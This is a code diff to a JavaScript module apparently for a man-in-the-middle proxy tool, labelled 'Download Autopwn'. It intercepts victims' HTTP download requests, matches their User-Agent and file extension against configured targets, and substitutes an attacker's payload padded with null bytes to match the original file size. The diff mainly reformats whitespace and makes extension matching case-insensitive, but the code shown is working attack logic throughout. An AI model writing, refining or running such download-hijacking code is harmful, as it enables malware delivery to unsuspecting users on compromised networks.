@@ -1,12 +1,12 @@
 var targets = {},
-		devices = []
+    devices = []
 
 var nullbyte = "\u0000"
 
 var green   = "\033[32m",
-		boldRed = "\033[1;31m",
-		onRed   = "\033[41m",
-		reset   = "\033[0m"
+    boldRed = "\033[1;31m",
+    onRed   = "\033[41m",
+    reset   = "\033[0m"
 
 function onLoad() {
 	devices = env("downloadautopwn.devices").split(",")
@@ -15,12 +15,12 @@ function onLoad() {
 		item = {
 			"device": devices[i],
 			"useragent": env("downloadautopwn.useragent." + devices[i]),
-			"extensions": env("downloadautopwn.extensions." + devices[i]).split(",")
+			"extensions": env("downloadautopwn.extensions." + devices[i]).toLowerCase().split(",")
 		}
 		targets[i] = item
 		logStr += "\n  " + green + targets[i]["device"] + reset +
-							"\n    User-Agent: " + targets[i]["useragent"] + 
-							"\n    Extensions: " + targets[i]["extensions"] + "\n"
+			  "\n    User-Agent: " + targets[i]["useragent"] + 
+			  "\n    Extensions: " + targets[i]["extensions"] + "\n"
 	}
 	log("Download Autopwn loaded.\n\nDownload Autopwn targets: \n" + logStr)
 }
@@ -30,7 +30,7 @@ function onResponse(req, res) {
 	var strippedPath = req.Path.replace(/.*\//g, "")
 	if (strippedPath.indexOf(".") != -1) {
 		var userAgent,
-				extension
+		    extension
 		// Grab User-Agent
 		for (var h = 0; h < req.Headers.length; h++) {
 			if (req.Headers[h]["Name"] == "User-Agent") {
@@ -46,7 +46,7 @@ function onResponse(req, res) {
 				for (var e = 0; e < targets[t]["extensions"].length; e++) {
 					// Check if requested path contains a targeted extension
 					// function endsWith() could be a nice simplification here
-					if ( strippedPath.replace(/.*\./g, "") == targets[t]["extensions"][e] ) {
+					if ( strippedPath.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
 						extension = targets[t]["extensions"][e]
 						// Autopwn
 						logStr = "\n\n  " + onRed + " " + reset + "  Autopwning download request from " + boldRed + req.Client + reset
@@ -62,7 +62,7 @@ function onResponse(req, res) {
 						logStr += "\n  " + onRed + " " + reset + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"
 						logStr += "\n  " + onRed + " " + reset + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
 						logStr += "\n  " + onRed + " " + reset
-						// Append nullbytes to payload if requested file is larger than payload
+						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
 						if (requestedFileSize > payloadSize && env("downloadautopwn.resizepayloads") == "true") {
 							logStr += "\n  " + onRed + " " + reset + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
 							sizeDifference = requestedFileSize - payloadSize
